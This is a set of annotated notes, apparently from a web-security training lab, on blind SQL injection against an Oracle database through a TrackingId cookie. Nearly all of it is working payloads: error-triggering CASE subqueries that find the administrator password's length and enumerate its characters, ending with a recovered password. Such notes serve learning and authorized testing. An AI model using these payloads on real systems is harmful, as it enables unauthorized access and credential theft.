/*

its an oracle DB (given)

1) Cookie: TrackingId=abc; 
//the Id is invalid (because no user has abc tracking id) but the query 
//wont say that as it is blind

2) Cookie: TrackingId=abc'; 
//Internal Server Error
//we want info from the db by asking the db true or false questions

3) Cookie: TrackingId=abc' AND 1=1--;
//results in a valid response , no error

4) Cookie: TrackingId=abc' AND 1=0--;
//results in a valid response , no error
//so we cant ask the db true or false conditions
//we can only know if a query is valid or not
//we can use a case subquery

5) Cookie: TrackingId=abc' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' --;
//no error 

6) Cookie: TrackingId=abc' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' --;
//error
//so using a subquery case statement we can find out info
//now we can ask true false 
//a true subquery will cause an error

7) //lets find length of password
Cookie: TrackingId=abc' AND (SELECT CASE WHEN LENGTH(password) >1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a' --
//send to intruder
//password length is 20

8) //enumerate letters of password
Cookie: TrackingId=abc' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a' --
//If spits out an error the letter matches
//SUBSTR is an oracle function
//send to intruder
//f06o55gi7as487xs7uya

*/